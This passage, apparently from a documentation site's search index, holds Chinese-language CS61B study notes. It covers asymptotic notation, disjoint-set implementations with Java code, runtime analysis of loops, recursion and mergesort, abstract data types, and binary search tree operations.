O</code>\u8868\u793a\uff1a</li> <li>R(N) \u2208 O(g(N))</li> <li>\u5b58\u5728\u4e00\u4e2a\u6b63\u7684\u5e38\u6570<code>k2</code>\uff0c\u4f7f\u5f97\u5bf9\u4e8e\u8db3\u591f\u5927\u7684<code>N</code>\uff0c\u4e0b\u5217\u4e0d\u7b49\u5f0f\u6210\u7acb\uff1a     <code>R(N) \u2264 k2 * g(N)</code> </li> <li>Big Omega (\u03a9)\uff1a\u8868\u793a\u589e\u957f\u7684\u4e0b\u754c</li> <li>\u5982\u679c\u6709\u4e00\u4e2a\u51fd\u6570<code>R(N)</code>\u7684\u589e\u957f\u81f3\u5c11\u662f<code>g(N)</code>\uff0c\u6211\u4eec\u53ef\u4ee5\u7528<code>Big Omega</code>\u8868\u793a\uff1a</li> <li>N<sup>4</sup> \u2208 \u03a9(N<sup>3</sup>)</li> <li>\u5b58\u5728\u4e00\u4e2a\u6b63\u7684\u5e38\u6570<code>k1</code>\uff0c\u4f7f\u5f97\u5bf9\u4e8e\u8db3\u591f\u5927\u7684<code>N</code>\uff0c\u4e0b\u5217\u4e0d\u7b49\u5f0f\u6210\u7acb\uff1a     <code>R(N) \u2265 k1 * g(N)</code> </li> <li>Big Theta (\u0398) \u7684\u7528\u9014\u6700\u4e3a\u5e7f\u6cdb\uff0c\u56e0\u4e3a\u5b83\u63d0\u4f9b\u4e86\u51fd\u6570\u589e\u957f\u7684\u51c6\u786e\u901f\u7387\u3002Big O (\u039f) \u7528\u4e8e\u6700\u574f\u60c5\u51b5\u5206\u6790\uff0c\u800c Big Omega (\u03a9) \u7528\u4e8e\u6700\u597d\u60c5\u51b5\u5206\u6790</li> </ol> </li> </ol>"},{"location":"cs61b%20notes/w1dsy2ew/#lec14_disjoin_sets","title":"Lec.14  Disjoin Sets \u4e0d\u76f8\u4ea4\u96c6/\u5e76\u67e5\u96c6","text":""},{"location":"cs61b%20notes/w1dsy2ew/#141","title":"14.1 \u57fa\u672c\u64cd\u4f5c","text":"<ul> <li><code>connect(x, y)</code>\uff1a\u8fde\u63a5\u4e24\u4e2a\u5143\u7d20<code>x</code>\u548c<code>y</code></li> <li><code>isConnected(x, y)</code>\uff1a\u5224\u65ad\u4e24\u4e2a\u5143\u7d20\u662f\u5426\u8fde\u63a5\uff08\u76f4\u63a5\u6216\u95f4\u63a5\u8fde\u63a5\uff09</li> </ul> <pre><code>public interface DisjointSets {\n    /** \u8fde\u63a5\u4e24\u4e2a\u5143\u7d20p\u548cq */\n    void connect(int p, int q);\n\n    /** \u5224\u65ad\u4e24\u4e2a\u5143\u7d20\u662f\u5426\u8fde\u901a */\n    boolean isConnected(int p, int q);\n}\n</code></pre>"},{"location":"cs61b%20notes/w1dsy2ew/#142_through_list_of_set","title":"14.2 Through List of Set","text":"<ol> <li>\u901a\u8fc7\u6574\u6570\u96c6\u5408\u7684\u5217\u8868\uff0ce.g.<code>[{0, 1, 2, 4}, {3, 5}, {6}]</code> \u76f4\u89c2\u4f46\u662f\u7cdf\u7cd5</li> <li>\u7f3a\u70b9</li> <li>\u6240\u6709\u7684\u67e5\u627e\u64cd\u4f5c\u90fd\u9700\u8981\u904d\u5386\u5168\u90e8\u7684\u96c6\u5408</li> <li>Overall runtime of <code>\u0398(N)</code>.</li> </ol>"},{"location":"cs61b%20notes/w1dsy2ew/#143_quickfind","title":"14.3 QuickFind \u5feb\u901f\u67e5\u627e","text":"<ol> <li>\u4f7f\u7528\u4e00\u4e2a\u6570\u7ec4<code>id</code>\uff0c\u8bb0\u5f55\u6bcf\u4e00\u4e2a\u5143\u7d20\u6240\u5c5e\u7684\u96c6\u5408\u7f16\u53f7</li> <li>Performance</li> <li><code>isConnected(p, q)</code>\uff1a\u901a\u8fc7\u6bd4\u8f83<code>id[p]</code>\u548c<code>id[q]</code>\u662f\u5426\u76f8\u7b49\u5b9e\u73b0\uff0c\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a<code>O(1)</code></li> <li><code>connect(p, q)</code>\uff1a\u5bf9\u6574\u4e2a<code>id</code>\u6570\u7ec4\u8fdb\u884c\u904d\u5386\uff0c\u5c06\u6240\u6709\u7b49\u4e8e<code>id[p]</code>\u7684\u5143\u7d20\u66f4\u65b0\u4e3a<code>id[q]</code>\uff0c\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a<code>O(N)</code>\uff0c\u5176\u4e2d<code>N</code>\u4e3a\u5143\u7d20\u603b\u6570</li> <li><code>QuickFind</code>\u65b9\u6cd5\u7b80\u5355\u4f46\u5728\u5904\u7406\u5927\u91cf\u8fde\u63a5\u64cd\u4f5c\u65f6\u6548\u7387\u4f4e\u4e0b</li> </ol> <pre><code>public class QuickFindDS implements DisjointSets {\n    private int[] id; // \u7528\u4e8e\u5b58\u50a8\u6bcf\u4e2a\u5143\u7d20\u6240\u5c5e\u7684\u96c6\u5408\u7f16\u53f7\n\n    /* \u6784\u9020\u51fd\u6570\uff0c\u521d\u59cb\u5316N\u4e2a\u5143\u7d20\uff0c\u6bcf\u4e2a\u5143\u7d20\u81ea\u5df1\u7684\u96c6\u5408\u7f16\u53f7\u7b49\u4e8e\u81ea\u5df1\u7684\u7d22\u5f15\uff08\u521d\u59cb\u6709N\u4e2a\u96c6\u5408\uff09*/\n    public QuickFindDS(int N) {\n        id = new int[N];\n        for (int i = 0; i &lt; N; i++) {\n            id[i] = i;\n        }\n    }\n\n    /* \u901a\u8fc7\u6bd4\u8f83\u96c6\u5408\u7f16\u53f7\u5224\u65ad\u662f\u5426\u5728\u540c\u4e00\u4e2a\u96c6\u5408\u4e2d */\n    public boolean isConnected(int p, int q) {\n        return id[p] == id[q];\n    }\n\n    // \u8fde\u63a5\u4e24\u4e2a\u5143\u7d20\uff0c\u5c06\u5c5e\u4e8eid[p]\u96c6\u5408\u7684\u6240\u6709\u5143\u7d20\u66f4\u65b0\u4e3aid[q]\n    public void connect(int p, int q) {\n        int pid = id[p]; // \u83b7\u53d6p\u7684\u96c6\u5408\u7f16\u53f7\n        int qid = id[q]; // \u83b7\u53d6q\u7684\u96c6\u5408\u7f16\u53f7\n        for (int i = 0; i &lt; id.length; i++) {\n            if (id[i] == pid) {\n                id[i] = qid; // \u5c06\u5c5e\u4e8eid[p]\u96c6\u5408\u7684\u5143\u7d20\u66f4\u65b0\u4e3aid[q]\n            }\n        }\n    }\n}\n</code></pre>"},{"location":"cs61b%20notes/w1dsy2ew/#144_quickunion","title":"14.4 QuickUnion \u5feb\u901f\u8fde\u63a5","text":"<ol> <li><code>Quick Union</code>\u6539\u8fdb\u4e86<code>Quick Find</code>\uff0c\u901a\u8fc7\u4f7f\u7528\u6811\u7ed3\u6784\u6765\u8868\u793a\u96c6\u5408\uff0c\u6bcf\u4e2a\u5143\u7d20\u6307\u5411\u5b83\u7684\u7236\u8282\u70b9<code>parent node</code></li> <li>Performance\uff1a</li> <li><code>isConnected(p, q)</code>\uff1a\u901a\u8fc7\u5bfb\u627e\u6839\u8282\u70b9\u8fdb\u884c\u5224\u65ad\uff0c\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a\u6811\u9ad8\u5ea6<code>O(H)</code></li> <li><code>connect(p, q)</code>\uff1a\u627e\u5230\u4e24\u4e2a\u5143\u7d20\u7684\u6839\u8282\u70b9<code>root node</code>\uff0c\u5c06\u4e00\u4e2a\u6839\u8282\u70b9\u8fde\u63a5\u5230\u53e6\u4e00\u4e2a\u6839\u8282\u70b9\uff0c\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a<code>O(H)</code></li> <li><code>QuickUnion</code>\u5728\u5904\u7406\u8fc7\u7a0b\u4e2d\u53ef\u80fd\u5bfc\u81f4\u6811\u9ad8\u5ea6\u4e0d\u65ad\u589e\u52a0\uff0c\u4ece\u800c\u5f71\u54cd\u67e5\u8be2\u548c\u8fde\u63a5\u64cd\u4f5c\u7684\u6548\u7387</li> </ol> <pre><code>public class QuickUnionDS implements DisjointSets {\n    private int[] parent; // \u7528\u4e8e\u5b58\u50a8\u6bcf\u4e2a\u5143\u7d20\u7684\u7236\u8282\u70b9\n\n    /* \u6784\u9020\u51fd\u6570\uff0c\u521d\u59cb\u5316N\u4e2a\u5143\u7d20\uff0c\u6bcf\u4e2a\u5143\u7d20\u7684\u7236\u8282\u70b9\u662f\u5b83\u81ea\u5df1 */\n    public QuickUnionDS(int N) {\n        parent = new int[N];\n        for (int i = 0; i &lt; N; i++) {\n            parent[i] = i;\n        }\n    }\n\n    /* \u67e5\u627e\u5143\u7d20p\u7684\u6839\u8282\u70b9 */\n    private int find(int p) {\n        while (p != parent[p]) {\n            p = parent[p]; // \u4e0d\u65ad\u5411\u4e0a\u627e\u5230\u6839\u8282\u70b9\n        }\n        return p;\n    }\n\n    /* \u5224\u65ad\u4e24\u4e2a\u5143\u7d20\u662f\u5426\u5728\u540c\u4e00\u4e2a\u96c6\u5408\u4e2d\uff0c\u901a\u8fc7\u67e5\u627e\u5b83\u4eec\u7684\u6839\u8282\u70b9 */\n    public boolean isConnected(int p, int q) {\n        return find(p) == find(q);\n    }\n\n    /* \u8fde\u63a5\u4e24\u4e2a\u5143\u7d20\uff0c\u5c06p\u7684\u6839\u8282\u70b9\u8fde\u63a5\u5230q\u7684\u6839\u8282\u70b9 */\n    public void connect(int p, int q) {\n        int rootP = find(p); // \u67e5\u627ep\u7684\u6839\u8282\u70b9\n        int rootQ = find(q); // \u67e5\u627eq\u7684\u6839\u8282\u70b9\n        if (rootP != rootQ) {\n            parent[rootP] = rootQ; // \u5c06p\u7684\u6839\u8282\u70b9\u8fde\u63a5\u5230q\u7684\u6839\u8282\u70b9\n        }\n    }\n}\n</code></pre>"},{"location":"cs61b%20notes/w1dsy2ew/#145_weighted_quick_union_wqu","title":"14.5 Weighted Quick Union (WQU) \u52a0\u6743\u5feb\u901f\u5408\u5e76","text":"<ol> <li>\u52a0\u6743\u5feb\u901f\u5408\u5e76\u901a\u8fc7\u8bb0\u5f55\u6811\u7684\u5927\u5c0f\uff08\u5373\u6811\u4e2d\u5143\u7d20\u7684\u6570\u91cf\uff09\u6765\u9009\u62e9\u6839\u8282\u70b9\uff0c\u4ece\u800c\u907f\u514d\u6811\u9ad8\u5ea6\u8fc7\u9ad8<ul> <li>\u5c06\u8f83\u5c0f\u6811\u7684\u6839\u8282\u70b9\u8fde\u63a5\u5230\u8f83\u5927\u6811\u7684\u6839\u8282\u70b9\uff0c\u4ece\u800c\u4f18\u5316\u6570\u7684\u9ad8\u5ea6\uff0c\u4f7f\u6811\u66f4\u52a0\u6241\u5e73\u5316</li> </ul> </li> <li>\u76f8\u8f83\u4e8e<code>QuickUnion</code>\uff0c\u5176\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a<code>O(log N)</code></li> <li>\u5b9e\u9645\u4e0a\uff0c\u901a\u8fc7\u8bb0\u5f55\u6811\u7684\u9ad8\u5ea6\u8fdb\u884c\u6bd4\u8f83\u4e5f\u80fd\u8fbe\u5230\u76f8\u540c\u7684\u6548\u679c(without improvement)\uff0c\u4f46\u662f\u5b9e\u73b0\u7684\u4ee3\u7801\u66f4\u4e3a\u590d\u6742 (more complex)</li> </ol> <pre><code>public class WeightedQuickUnionDS implements DisjointSets {\n    private int[] parent; // \u7528\u4e8e\u5b58\u50a8\u6bcf\u4e2a\u5143\u7d20\u7684\u7236\u8282\u70b9\n    private int[] size;   // \u7528\u4e8e\u5b58\u50a8\u6bcf\u4e2a\u6811\u7684\u5927\u5c0f\n\n    /* \u6784\u9020\u51fd\u6570\uff0c\u521d\u59cb\u5316N\u4e2a\u5143\u7d20\uff0c\u6bcf\u4e2a\u5143\u7d20\u7684\u7236\u8282\u70b9\u662f\u5b83\u81ea\u5df1\uff0c\u4e14\u5927\u5c0f\u4e3a1 */\n    public WeightedQuickUnionDS(int N) {\n        parent = new int[N];\n        size = new int[N];\n        for (int i = 0; i &lt; N; i++) {\n            parent[i] = i;\n            size[i] = 1;\n        }\n    }\n\n    /* \u67e5\u627e\u5143\u7d20p\u7684\u6839\u8282\u70b9 */\n    private int find(int p) {\n        while (p != parent[p]) {\n            p = parent[p]; // \u4e0d\u65ad\u5411\u4e0a\u627e\u5230\u6839\u8282\u70b9\n        }\n        return p;\n    }\n\n    /* \u5224\u65ad\u4e24\u4e2a\u5143\u7d20\u662f\u5426\u5728\u540c\u4e00\u4e2a\u96c6\u5408\u4e2d\uff0c\u901a\u8fc7\u67e5\u627e\u5b83\u4eec\u7684\u6839\u8282\u70b9 */\n    public boolean isConnected(int p, int q) {\n        return find(p) == find(q);\n    }\n\n    /* \u8fde\u63a5\u4e24\u4e2a\u5143\u7d20\uff0c\u5c06\u8f83\u5c0f\u7684\u6811\u8fde\u63a5\u5230\u8f83\u5927\u7684\u6811 */\n    public void connect(int p, int q) {\n        int rootP = find(p); // \u67e5\u627ep\u7684\u6839\u8282\u70b9\n        int rootQ = find(q); // \u67e5\u627eq\u7684\u6839\u8282\u70b9\n        if (rootP != rootQ) {\n            if (size[rootP] &lt; size[rootQ]) {\n                parent[rootP] = rootQ; // \u5c06\u8f83\u5c0f\u6811\u7684\u6839\u8282\u70b9\u8fde\u63a5\u5230\u8f83\u5927\u6811\u7684\u6839\u8282\u70b9\n                size[rootQ] += size[rootP]; // \u66f4\u65b0\u6839\u8282\u70b9q\u7684\u5927\u5c0f\n            } else {\n                parent[rootQ] = rootP; // \u5c06\u8f83\u5c0f\u6811\u7684\u6839\u8282\u70b9\u8fde\u63a5\u5230\u8f83\u5927\u6811\u7684\u6839\u8282\u70b9\n                size[rootP] += size[rootQ]; // \u66f4\u65b0\u6839\u8282\u70b9p\u7684\u5927\u5c0f\n            }\n        }\n    }\n}\n</code></pre>"},{"location":"cs61b%20notes/w1dsy2ew/#146_weighted_quick_union_with_path_compression_wqupc","title":"14.6 Weighted Quick Union with Path Compression (WQUPC)","text":"<ol> <li>\u8def\u5f84\u538b\u7f29\u6280\u672f\u5728\u6bcf\u6b21\u67e5\u627e\u64cd\u4f5c\u4e2d\uff0c\u5c06\u8def\u5f84\u4e0a\u7684\u6240\u6709\u7ed3\u70b9\u76f4\u63a5\u8fde\u63a5\u5230\u6839\u8282\u70b9\uff0c\u4ece\u800c\u4f18\u5316\u6811\u7684\u9ad8\u5ea6\uff0c\u4f7f\u6811\u66f4\u52a0\u6241\u5e73\u5316</li> <li>Performance</li> <li>\u5728\u8fdb\u884c\u5927\u91cf<code>isConnected</code>\u548c<code>connect</code>\u64cd\u4f5c\u65f6\uff0c\u80fd\u591f\u5c06\u65f6\u95f4\u590d\u6742\u5ea6\u4f18\u5316\u4e3a\u51e0\u4e4e\u5e38\u91cf\u7ea7\u522b</li> <li> <p>\u5176\u5747\u644a\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a<code>O(log* N)</code>\uff0c<code>log* N</code> \u662f<code>Iterated Log</code>\uff0c\u5b9e\u9645\u5e94\u7528\u4e2d\uff0c\u8fd9\u4e2a\u503c\u975e\u5e38\u5c0f\uff0c\u901a\u5e38\u4e0d\u8d85\u8fc75</p> <p><sub><code>log* N</code>:\u4e0d\u65ad\u8fdb\u884c<code>log</code>\u64cd\u4f5c\u6700\u540e\u7b49\u4e8e1\u7684\u6b21\u6570</sub></p> </li> </ol> <pre><code>public class WQUDSWithPathCompression implements DisjointSets {\n    private int[] parent; // \u7528\u4e8e\u5b58\u50a8\u6bcf\u4e2a\u5143\u7d20\u7684\u7236\u8282\u70b9\n    private int[] size;   // \u7528\u4e8e\u5b58\u50a8\u6bcf\u4e2a\u6811\u7684\u5927\u5c0f\n\n    /* \u6784\u9020\u51fd\u6570\uff0c\u521d\u59cb\u5316N\u4e2a\u5143\u7d20\uff0c\u6bcf\u4e2a\u5143\u7d20\u7684\u7236\u8282\u70b9\u662f\u5b83\u81ea\u5df1\uff0c\u4e14\u5927\u5c0f\u4e3a1 */\n    public WQUDSWithPathCompression(int N) {\n        parent = new int[N];\n        size = new int[N];\n        for (int i = 0; i &lt; N; i++) {\n            parent[i] = i;\n            size[i] = 1;\n        }\n    }\n\n    /* \u67e5\u627e\u5143\u7d20p\u7684\u6839\u8282\u70b9\uff0c\u5e76\u4f7f\u7528\u8def\u5f84\u538b\u7f29 */\n    private int find(int p) {\n        if (p != parent[p]) {\n            parent[p] = find(parent[p]); // \u8def\u5f84\u538b\u7f29\uff0c\u5c06p\u7684\u7236\u8282\u70b9\u76f4\u63a5\u8fde\u63a5\u5230\u6839\u8282\u70b9\n        }\n        return parent[p];\n    }\n\n    /* \u5224\u65ad\u4e24\u4e2a\u5143\u7d20\u662f\u5426\u5728\u540c\u4e00\u4e2a\u96c6\u5408\u4e2d\uff0c\u901a\u8fc7\u67e5\u627e\u5b83\u4eec\u7684\u6839\u8282\u70b9 */\n    public boolean isConnected(int p, int q) {\n        return find(p) == find(q);\n    }\n\n    /* \u8fde\u63a5\u4e24\u4e2a\u5143\u7d20\uff0c\u5c06\u8f83\u5c0f\u7684\u6811\u8fde\u63a5\u5230\u8f83\u5927\u7684\u6811 */\n    public void connect(int p, int q) {\n        int rootP = find(p); // \u67e5\u627ep\u7684\u6839\u8282\u70b9\n        int rootQ = find(q); // \u67e5\u627eq\u7684\u6839\u8282\u70b9\n        if (rootP != rootQ) {\n            if (size[rootP] &lt; size[rootQ]) {\n                parent[rootP] = rootQ; // \u5c06\u8f83\u5c0f\u6811\u7684\u6839\u8282\u70b9\u8fde\u63a5\u5230\u8f83\u5927\u6811\u7684\u6839\u8282\u70b9\n                size[rootQ] += size[rootP]; // \u66f4\u65b0\u6839\u8282\u70b9q\u7684\u5927\u5c0f\n            } else {\n                parent[rootQ] = rootP; // \u5c06\u8f83\u5c0f\u6811\u7684\u6839\u8282\u70b9\u8fde\u63a5\u5230\u8f83\u5927\u6811\u7684\u6839\u8282\u70b9\n                size[rootP] += size[rootQ]; // \u66f4\u65b0\u6839\u8282\u70b9p\u7684\u5927\u5c0f\n            }\n        }\n    }\n}\n</code></pre>"},{"location":"cs61b%20notes/w1dsy2ew/#147","title":"14.7 \u603b\u4f53\u8fd0\u884c\u65f6\u95f4\u6bd4\u8f83","text":"Implementation Runtime <code>ListOfSetsDS</code> <code>O(NM)</code> <code>QuickFindDS</code> <code>\u0398(NM)</code> <code>QuickUnionDS</code> <code>O(NM)</code> <code>WeightedQuickUnionDS</code> <code>O(M log N)</code> <code>WQUDSWithPathCompression</code> <code>O(M \u03b1(N))</code>"},{"location":"cs61b%20notes/w1dsy2ew/#lec15_asymptotics_ii","title":"Lec.15 Asymptotics II \u4e00\u4e9b\u51fd\u6570\u7684\u6e10\u8fdb\u6027\u5206\u6790","text":"<ol> <li> <p><code>For</code> Loop</p> <pre><code>public static void printParty(int N) {\n    for (int i = 1; i &lt;= N; i = i * 2) {\n        for (int j = 0; j &lt; i; j += 1) {\n            System.out.println(\"hello\");\n            int ZUG = 1 + 1;\n        }\n    }\n}\n</code></pre> <ul> <li><code>C(N) = 1 + 2 + 4+ ... + N</code> \u5982\u679c<code>N</code>\u662f<code>2</code>\u7684\u5e42</li> <li>\u5982\u56fe\uff1a<code>R(N) = \u0398(1 + 2 + 4 + 8 + \u2026 + N) = \u0398(N)</code> </li> </ul> </li> <li> <p><code>Recursion</code></p> <pre><code>public static int f3(int n) {\n    if (n &lt;= 1) \n        return 1;\n    return f3(n-1) + f3(n-1);\n}\n</code></pre> <ul> <li>C(N) = 1 + 2 + 4 + ... + 2<sup>N-1</sup> = 2<sup>N</sup> - 1</li> <li>R(N) = \u0398(2<sup>N</sup>)</li> </ul> </li> <li> <p><code>Binary Search</code></p> <ul> <li>R(N) = \u0398(log<sub>2</sub>N) = \u0398(log N)</li> </ul> </li> <li> <p>\u5408\u5e76\u5df2\u6392\u5e8f\u7684\u6570\u7ec4</p> </li> <li> <p>R(N) = \u0398(N)</p> </li> <li> <p><code>Mergesort</code> \u5f52\u5e76\u6392\u5e8f</p> <ul> <li>\u5982\u679c\u5217\u8868\u5927\u5c0f\u4e3a 1\uff0c\u8fd4\u56de\u3002\u5426\u5219\uff1a</li> <li>\u5bf9\u5de6\u534a\u90e8\u5206\u8fdb\u884c\u5f52\u5e76\u6392\u5e8f</li> <li>\u5bf9\u53f3\u534a\u90e8\u5206\u8fdb\u884c\u5f52\u5e76\u6392\u5e8f</li> <li>\u5408\u5e76\u7ed3\u679c</li> <li>\u5206\u6cbb\u7684\u5c42\u6570 k = log<sub>2</sub>N</li> <li>\u6bcf\u5c42\u8fdb\u884c\u5408\u5e76\u64cd\u4f5c\u7684\u6b21\u6570\u90fd\u4e3a N</li> <li>R(N) = \u0398(Nlog(N))</li> </ul> </li> </ol>"},{"location":"cs61b%20notes/w1dsy2ew/#lec16_adts_sets_maps_bsts","title":"Lec.16 ADTs, Sets, Maps, BSTs","text":""},{"location":"cs61b%20notes/w1dsy2ew/#161_adts","title":"16.1 <code>ADTs</code> \u62bd\u8c61\u6570\u636e\u7c7b\u578b","text":"<ol> <li><code>Abstract Data Type</code>: \u7531\u5176\u64cd\u4f5c<code>Operations</code>\u5b9a\u4e49\uff0c\u800c\u4e0d\u662f\u7531\u5176\u5b9e\u73b0\u65b9\u5f0f<code>Implementation</code>\u5b9a\u4e49<ul> <li><code>ArrayDeque</code>\u548c <code>LinkedListDeque</code>\u5177\u6709\u76f8\u540c\u7684\u65b9\u6cd5\uff0c\u4f46\u5b9e\u73b0\u65b9\u5f0f\u5927\u76f8\u5f84\u5ead\uff0c\u56e0\u6b64\u8bf4 <code>ArrayDeque</code> \u548c <code>LinkedListDeque</code> \u662f <code>Deque ADT</code>\u7684\u5b9e\u73b0 (inherit from the <code>Deque</code> interface)</li> </ul> </li> <li>\u5e38\u89c1\u7684\u62bd\u8c61\u6570\u636e\u7ed3\u6784\uff1a<ul> <li>\u6808 <code>stack</code>\uff1a\u652f\u6301\u540e\u8fdb\u5148\u51fa\u68c0\u7d22\u5143\u7d20\u7684\u7ed3\u6784<ul> <li><code>push(int x)</code>\uff1a\u5c06 <code>x</code> \u653e\u5728\u6808\u9876</li> <li><code>int pop()</code>\uff1a\u53d6\u51fa\u6808\u9876\u5143\u7d20</li> </ul> </li> <li>\u5217\u8868 <code>list</code>\uff1a\u6709\u5e8f\u5143\u7d20\u96c6\u5408<ul> <li><code>add(int i)</code>\uff1a\u6dfb\u52a0\u5143\u7d20</li> <li><code>int get(int i)</code>\uff1a\u83b7\u53d6\u7d22\u5f15 <code>i</code> \u5904\u7684\u5143\u7d20</li> </ul> </li> <li>\u96c6\u5408 <code>set</code>\uff1a\u65e0\u5e8f\u552f\u4e00\u5143\u7d20\u96c6\u5408\uff08\u4e0d\u91cd\u590d\uff09<ul> <li><code>add(int i)</code>\uff1a\u6dfb\u52a0\u5143\u7d20</li> <li><code>contains(int i)</code>\uff1a\u8fd4\u56de\u96c6\u5408\u662f\u5426\u5305\u542b\u8be5\u503c\u7684\u5e03\u5c14\u503c</li> </ul> </li> <li>\u6620\u5c04 <code>map</code>\uff1a\u952e/\u503c\u5bf9\u96c6\u5408<ul> <li><code>put(K key, V value)</code>\uff1a\u5c06\u952e\u503c\u5bf9\u653e\u5165\u6620\u5c04\u4e2d</li> <li><code>V get(K key)</code>\uff1a\u83b7\u53d6\u4e0e\u952e\u5bf9\u5e94\u7684\u503c</li> </ul> </li> <li>Notes\uff1a\u52a0\u7c97\u7684 <code>ADT</code> \u662f\u4e00\u4e2a\u66f4\u5927\u7684\u603b\u4f53\u63a5\u53e3 <code>Collections</code> \u7684\u5b50\u63a5\u53e3  \u63a5\u53e3\u548c\u7c7b\u4e4b\u95f4\u7684\u5173\u7cfb\uff0c\u63a5\u53e3\u662f\u767d\u8272\uff0c\u7c7b\u662f\u84dd\u8272</li> </ul> </li> </ol>"},{"location":"cs61b%20notes/w1dsy2ew/#162_binary_search_tree","title":"16.2 <code>Binary Search Tree</code> \u4e8c\u53c9\u641c\u7d22\u6811","text":"<ol> <li> <p>\u6811\u7684\u5b9a\u4e49\uff1a\u6811\u7531\u8282\u70b9\u548c\u8fde\u63a5\u8fd9\u4e9b\u8282\u70b9\u7684\u8fb9\u7ec4\u6210</p> <ul> <li>Constraints\uff1a\u4efb\u4f55\u4e24\u4e2a\u8282\u70b9\u4e4b\u95f4\u53ea\u6709\u4e00\u6761\u8def\u5f84</li> <li>\u6839\u8282\u70b9<code>root node</code>\uff1a\u6ca1\u6709\u7236\u8282\u70b9\u7684\u8282\u70b9</li> <li>\u53f6\u8282\u70b9<code>leaf node</code>\uff1a\u6ca1\u6709\u5b50\u8282\u70b9\u7684\u8282\u70b9</li> </ul> </li> <li> <ul> <li>\u4e8c\u53c9\u6811\uff1a\u5728\u6811\u7684\u57fa\u7840\u4e0a\uff0c\u6bcf\u4e2a\u8282\u70b9\u53ea\u80fd\u67090\u30011\u62162\u4e2a\u5b50\u8282\u70b9 (binary property constraint)</li> </ul> </li> <li> <p>\u4e8c\u53c9\u641c\u7d22\u6811\uff1a\u5728\u4e8c\u53c9\u6811\u7684\u57fa\u7840\u4e0a\uff0c\u5bf9\u4e8e\u6811\u4e2d\u7684\u6bcf\u4e2a\u8282\u70b9 <code>X</code>\uff1a         - \u5de6\u5b50\u6811 (subtree) \u4e2d\u7684\u6bcf\u4e2a\u952e\u90fd\u5c0f\u4e8e<code>X</code>\u7684\u952e         - \u53f3\u5b50\u6811\u4e2d\u7684\u6bcf\u4e2a\u952e\u90fd\u5927\u4e8e<code>X</code>\u7684\u952e</p> <pre><code>private class BST&lt;Key&gt; {\n    private Key key;\n    private BST left;\n    private BST right;\n\n    public BST(Key key, BST left, BST right) {\n        this.key = key;\n        this.left = left;\n        this.right = right;\n    }\n\n    public BST(Key key) {\n        this.key = key;\n    }\n}\n</code></pre> </li> <li> <p>\u641c\u7d22<code>Search</code></p> <pre><code>static BST find(BST T, Key sk) {\nif (T == null)\n    return null;\nif (sk.equals(T.key))\n    return T;\nelse if (sk &lt; T.key)\n    return find(T.left, sk);\nelse\n    return find(T.right, sk);\n}\n</code></pre> <ul> <li>\u5982\u679c<code>X</code>\u5927\u4e8e\u6839\u8282\u70b9\uff0c\u6211\u4eec\u7ee7\u7eed\u79fb\u52a8\u5230\u6839\u7684\u53f3\u5b50\u8282\u70b9\uff0c\u53cd\u4e4b\uff0c\u79fb\u52a8\u5230\u6839\u7684\u5de6\u5b50\u8282\u70b9</li> <li>\u9012\u5f52\u5730\u91cd\u590d\u6b64\u8fc7\u7a0b\uff0c\u76f4\u5230</li> <li>\u627e\u5230\u9879\u76ee</li> <li>\u5230\u8fbe\u53f6\u5b50\u8282\u70b9\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u6811\u4e0d\u5305\u542b\u8be5\u9879\u76ee</li> <li>\u67e5\u627e\u64cd\u4f5c\u5c06\u4ee5<code>log n</code>\u65f6\u95f4\u8fd0\u884c\uff0c\u56e0\u4e3a\u6811\u7684\u9ad8\u5ea6\u662f<code>log n</code></li> </ul> </li> <li> <p>\u63d2\u5165<code>Insert</code></p> <pre><code>static BST insert(BST T, Key ik) {\nif (T == null)\n    return new BST(ik);\nif (ik &lt; T.key)\n    T.left = insert(T.left, ik);\nelse if (ik &gt; T.key)\n    T.right = insert(T.right, ik);\nreturn T;\n}\n</code></pre> <ul> <li>\u9996\u5148\u5728\u6811\u4e2d\u641c\u7d22\u8282\u70b9\u3002</li> <li>\u5982\u679c\u627e\u5230\uff0cdo nothing</li> <li>\u5982\u679c\u6ca1\u627e\u5230\uff0c\u6b64\u65f6\u5df2\u7ecf\u4f4d\u4e8e\u53f6\u8282\u70b9\u4e86\uff0c\u5728\u53f6\u8282\u70b9\u7684\u5de6\u4fa7\u6216\u53f3\u4fa7\u6dfb\u52a0\u65b0\u5143\u7d20\uff0c\u540c\u65f6\u4fdd\u6301<code>BST</code>\u7684\u5c5e\u6027</li> </ul> </li> <li> <p>\u5220\u9664<code>Delete</code></p> <ul> <li> <p>\u53ef\u80fd\u7684\u60c5\u51b5</p> <ul> <li>\u65e0\u5b50\u8282\u70b9</li> <li>\u6709\u4e00\u4e2a\u5b50\u8282\u70b9</li> <li>\u6709\u4e24\u4e2a\u5b50\u8282\u70b9</li> </ul> </li> <li> <p>\u65e0\u5b50\u8282\u70b9 \u53ea\u5220\u9664\u5176\u7236\u6307\u9488\uff0c\u8282\u70b9\u6700\u7ec8\u5c06\u88ab\u5783\u573e\u6536\u96c6\u5668\u6e05\u9664</p> </li> <li> <p>\u4e00\u4e2a\u5b50\u8282\u70b9 \u53ea\u91cd\u65b0\u5206\u914d\u7236\u7684\u5b50\u6307\u9488\u5230\u8282\u70b9\u7684\u5b50\u8282\u70b9\uff0c\u8282\u70b9\u6700\u7ec8\u5c06\u88ab\u5783\u573e\u6536\u96c6\u3002</p> </li> <li> <p>\u4e24\u4e2a\u5b50\u8282\u70b9</p> <ul> <li>\u5206\u6790\uff1a\u65b0\u8282\u70b9\u5fc5\u987b\uff1a<ul> <li>\u6bd4\u5de6\u5b50\u6811\u4e2d\u7684\u6240\u6709\u5185\u5bb9\u90fd\u8981\u5927</li> <li>\u6bd4\u53f3\u5b50\u6811\u4e2d\u7684\u6240\u6709\u5185\u5bb9\u90fd\u8981\u5c0f </li> </ul> </li> <li>\u4e0a\u56fe\u4e2d\uff0c\u5047\u8bbe\u8981\u5220\u9664\u7684\u662f<code>dog</code>\u8282\u70b9\uff0c\u90a3\u4e48\u5de6\u5b50\u6811\u4e2d\u7684<code>cat</code>\u8282\u70b9 (\u5de6\u5b50\u6811\u7684\u6700\u53f3\u8282\u70b9) \u548c\u53f3\u5b50\u6811\u7684 <code>elf</code> \u8282\u70b9 (\u53f3\u5b50\u6811\u7684\u6700\u5de6\u8282\u70b9) \u6ee1\u8db3\u8981\u6c42</li> 